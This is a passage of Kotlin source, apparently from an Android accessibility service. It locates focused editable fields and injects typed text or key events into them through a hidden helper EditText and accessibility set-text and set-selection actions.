        for (i in 0 until childCount) {
            val child = node.getChild(i)
            if (child != null) {
                if (child.isEditable && child.isFocusable) return child
                if (Build.VERSION.SDK_INT < 33) child.recycle()
            }
        }
        for (i in 0 until childCount) {
            val child = node.getChild(i)
            if (child != null) {
                val result = findChildNode(child)
                if (Build.VERSION.SDK_INT < 33) { if (child != result) child.recycle() }
                if (result != null) return result
            }
        }
        return null
    }

    private fun possibleAccessibiltyNodes(): LinkedList<AccessibilityNodeInfo> {
        val linkedList = LinkedList<AccessibilityNodeInfo>()
        val latestList = LinkedList<AccessibilityNodeInfo>()
        val focusInput = findFocus(AccessibilityNodeInfo.FOCUS_INPUT)
        val focusAccessibilityInput = findFocus(AccessibilityNodeInfo.FOCUS_ACCESSIBILITY)
        val rootInActiveWindow = getRootInActiveWindow()

        fun addNode(node: AccessibilityNodeInfo?, preferredList: LinkedList<AccessibilityNodeInfo>) {
            node ?: return
            if (node.isFocusable && node.isEditable) insertAccessibilityNode(linkedList, node)
            else insertAccessibilityNode(preferredList, node)
        }

        addNode(focusInput, latestList)
        addNode(focusAccessibilityInput, latestList)
        findChildNode(focusInput)?.let { insertAccessibilityNode(linkedList, it) }
        findChildNode(focusAccessibilityInput)?.let { insertAccessibilityNode(linkedList, it) }
        rootInActiveWindow?.let { insertAccessibilityNode(linkedList, it) }
        latestList.forEach { insertAccessibilityNode(linkedList, it) }
        return linkedList
    }

    private fun trySendKeyEvent(
        event: KeyEventAndroid, node: AccessibilityNodeInfo, textToCommit: String?
    ): Boolean {
        // refresh() нужен только для key events, не для textToCommit
        if (textToCommit == null) node.refresh()
        fakeEditTextForTextStateCalculation?.setSelection(0, 0)
        fakeEditTextForTextStateCalculation?.setText(null)

        val text = node.text
        var isShowingHint = false
        if (Build.VERSION.SDK_INT >= 26) isShowingHint = node.isShowingHintText

        var textSelectionStart = node.textSelectionStart
        var textSelectionEnd = node.textSelectionEnd
        if (text != null) {
            if (textSelectionStart > text.length) textSelectionStart = text.length
            if (textSelectionEnd > text.length) textSelectionEnd = text.length
            if (textSelectionStart > textSelectionEnd) textSelectionStart = textSelectionEnd
        }

        var success = false
        if (textToCommit != null) {
            if (textSelectionStart == -1 || textSelectionEnd == -1) {
                fakeEditTextForTextStateCalculation?.setText(textToCommit)
                success = updateTextForAccessibilityNode(node)
            } else if (text != null) {
                fakeEditTextForTextStateCalculation?.setText(text)
                fakeEditTextForTextStateCalculation?.setSelection(textSelectionStart, textSelectionEnd)
                fakeEditTextForTextStateCalculation?.text?.insert(textSelectionStart, textToCommit)
                success = updateTextAndSelectionForAccessibiltyNode(node)
            }
        } else {
            if (isShowingHint) fakeEditTextForTextStateCalculation?.setText(null)
            else fakeEditTextForTextStateCalculation?.setText(text)
            if (textSelectionStart != -1 && textSelectionEnd != -1) {
                fakeEditTextForTextStateCalculation?.setSelection(textSelectionStart, textSelectionEnd)
            }
            fakeEditTextForTextStateCalculation?.let {
                val rect = Rect()
                node.getBoundsInScreen(rect)
                it.layout(rect.left, rect.top, rect.right, rect.bottom)
                it.onPreDraw()
                if (event.action == KeyEventAndroid.ACTION_DOWN) it.onKeyDown(event.keyCode, event)
                else if (event.action == KeyEventAndroid.ACTION_UP) it.onKeyUp(event.keyCode, event)
            }
            success = updateTextAndSelectionForAccessibiltyNode(node)
        }
        return success
    }

    fun updateTextForAccessibilityNode(node: AccessibilityNodeInfo): Boolean {
        fakeEditTextForTextStateCalculation?.text?.let {
            val arguments = Bundle()
            arguments.putCharSequence(AccessibilityNodeInfo.ACTION_ARGUMENT_SET_TEXT_CHARSEQUENCE, it.toString())
            return node.performAction(AccessibilityNodeInfo.ACTION_SET_TEXT, arguments)
        }
        return false
    }

    fun updateTextAndSelectionForAccessibiltyNode(node: AccessibilityNodeInfo): Boolean {
        val success = updateTextForAccessibilityNode(node)
        if (success) {
            val start = fakeEditTextForTextStateCalculation?.selectionStart
            val end = fakeEditTextForTextStateCalculation?.selectionEnd
            if (start != null && end != null) {
                val arguments = Bundle()
                arguments.putInt(AccessibilityNodeInfo.ACTION_ARGUMENT_SELECTION_START_INT, start)
                arguments.putInt(AccessibilityNodeInfo.ACTION_ARGUMENT_SELECTION_END_INT, end)
                return node.performAction(AccessibilityNodeInfo.ACTION_SET_SELECTION, arguments)
            }
        }
        return success
    }
}
